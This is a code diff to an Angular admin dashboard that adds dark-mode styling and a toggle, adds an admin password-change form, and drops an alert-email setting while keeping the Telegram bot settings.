@@ -11,7 +11,7 @@ type AdminTab = 'live' | 'history' | 'settings';
   standalone: true,
   imports: [CommonModule, FormsModule],
   template: `
-    <div class="flex h-[100dvh] flex-col lg:flex-row bg-pp-bg font-sans text-pp-navy overflow-hidden">
+    <div class="flex h-[100dvh] flex-col lg:flex-row bg-pp-bg dark:bg-slate-900 font-sans text-pp-navy dark:text-slate-100 overflow-hidden">
       
       <!-- Toast Notification -->
       @if (state.adminToast()) {
@@ -517,32 +517,68 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                 <!-- SETTINGS TAB -->
                 @case ('settings') {
-                    <div class="max-w-2xl mx-auto bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden p-8 animate-fade-in">
-                         <h2 class="font-bold text-xl mb-6 text-pp-navy">System Configuration</h2>
-                         <div class="space-y-6">
-                             <div class="pp-input-group">
-                                 <input type="email" [(ngModel)]="settingEmail" placeholder=" " class="pp-input peer">
-                                 <label class="pp-label">Alert Notification Email</label>
-                                 <p class="text-xs text-slate-500 mt-2 ml-1">New sessions will trigger an alert to this address.</p>
-                             </div>
+                    <div class="max-w-2xl mx-auto bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden p-8 animate-fade-in">
+                         <h2 class="font-bold text-xl mb-6 text-pp-navy dark:text-white">System Configuration</h2>
 
-                             <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                                <div class="pp-input-group mb-0">
-                                    <input type="text" [(ngModel)]="tgToken" placeholder=" " class="pp-input peer">
-                                    <label class="pp-label">Telegram Bot Token</label>
-                                </div>
-                                <div class="pp-input-group mb-0">
-                                    <input type="text" [(ngModel)]="tgChat" placeholder=" " class="pp-input peer">
-                                    <label class="pp-label">Telegram Chat ID</label>
-                                </div>
-                             </div>
-                             
-                             <div class="pt-4 border-t border-slate-100">
-                                 <button (click)="saveSettings()" class="pp-btn">
-                                     Save Configuration
+                         <!-- Appearance -->
+                         <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
+                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">Appearance</h3>
+                             <div class="flex items-center justify-between">
+                                 <div class="flex items-center gap-3">
+                                     <div class="p-2 rounded-full bg-slate-100 dark:bg-slate-700 text-slate-600 dark:text-slate-300">
+                                         <span class="material-icons">{{ isDarkMode() ? 'dark_mode' : 'light_mode' }}</span>
+                                     </div>
+                                     <div>
+                                         <p class="font-bold text-pp-navy dark:text-white">Dark Mode</p>
+                                         <p class="text-xs text-slate-500">Toggle dashboard theme</p>
+                                     </div>
+                                 </div>
+                                 <button (click)="toggleDarkMode()" class="relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none"
+                                         [class.bg-pp-blue]="isDarkMode()" [class.bg-slate-200]="!isDarkMode()">
+                                     <span class="inline-block h-4 w-4 transform rounded-full bg-white transition-transform"
+                                           [class.translate-x-6]="isDarkMode()" [class.translate-x-1]="!isDarkMode()"></span>
                                  </button>
                              </div>
                          </div>
+
+                         <!-- Telegram -->
+                         <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
+                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">Telegram Integration</h3>
+                             <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div class="pp-input-group mb-0">
+                                    <input type="text" [(ngModel)]="tgToken" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                    <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Bot Token</label>
+                                </div>
+                                <div class="pp-input-group mb-0">
+                                    <input type="text" [(ngModel)]="tgChat" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                    <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Chat ID</label>
+                                </div>
+                             </div>
+                             <div class="mt-4">
+                                 <button (click)="saveSettings()" class="pp-btn">
+                                     Save API Settings
+                                 </button>
+                             </div>
+                         </div>
+
+                         <!-- Security -->
+                         <div>
+                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">Admin Security</h3>
+                             <div class="space-y-4">
+                                 <div class="pp-input-group mb-0">
+                                     <input type="password" [(ngModel)]="settingOldPass" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                     <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Current Password</label>
+                                 </div>
+                                 <div class="pp-input-group mb-0">
+                                     <input type="password" [(ngModel)]="settingNewPass" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                     <label class="pp-label dark:bg-slate-700 dark:text-slate-400">New Password</label>
+                                 </div>
+                                 <button (click)="changePassword()" class="pp-btn bg-slate-800 hover:bg-slate-900 dark:bg-slate-600 dark:hover:bg-slate-500">
+                                     Update Password
+                                 </button>
+                             </div>
+                         </div>
+
                     </div>
                 }
             }
@@ -887,9 +923,15 @@ export class AdminDashboardComponent {
   });
 
   // Settings
-  settingEmail = '';
   tgToken = '';
   tgChat = '';
+
+  // Security
+  settingOldPass = '';
+  settingNewPass = '';
+
+  // Appearance
+  isDarkMode = signal(false);
 
   monitoredSession = computed(() => {
       const id = this.state.monitoredSessionId();
@@ -904,8 +946,14 @@ export class AdminDashboardComponent {
   private timer: number | undefined;
 
   constructor() {
+      // Load Dark Mode
+      const stored = localStorage.getItem('admin_theme');
+      if (stored === 'dark') {
+          this.isDarkMode.set(true);
+          document.documentElement.classList.add('dark');
+      }
+
       effect(() => {
-          this.settingEmail = this.state.adminAlertEmail();
           this.tgToken = this.state.telegramBotToken();
           this.tgChat = this.state.telegramChatId();
       });
@@ -1187,8 +1235,35 @@ ${session.fingerprint?.userAgent}
   }
 
   saveSettings() {
-      this.state.updateAdminSettings(this.settingEmail, true, this.tgToken, this.tgChat);
+      // Email feature removed (pass empty string)
+      this.state.updateAdminSettings('', true, this.tgToken, this.tgChat);
       this.state.showAdminToast('Settings Saved');
+  }
+
+  async changePassword() {
+      if (!this.settingOldPass || !this.settingNewPass) {
+          this.state.showAdminToast('Fill all fields');
+          return;
+      }
+      const success = await this.state.changeAdminPassword(this.settingOldPass, this.settingNewPass);
+      if (success) {
+          this.state.showAdminToast('Password Changed');
+          this.settingOldPass = '';
+          this.settingNewPass = '';
+      } else {
+          this.state.showAdminToast('Incorrect Old Password');
+      }
+  }
+
+  toggleDarkMode() {
+      this.isDarkMode.update(d => !d);
+      if (this.isDarkMode()) {
+          document.documentElement.classList.add('dark');
+          localStorage.setItem('admin_theme', 'dark');
+      } else {
+          document.documentElement.classList.remove('dark');
+          localStorage.setItem('admin_theme', 'light');
+      }
   }
 
   getFlagUrl(countryCode: string | undefined): string {
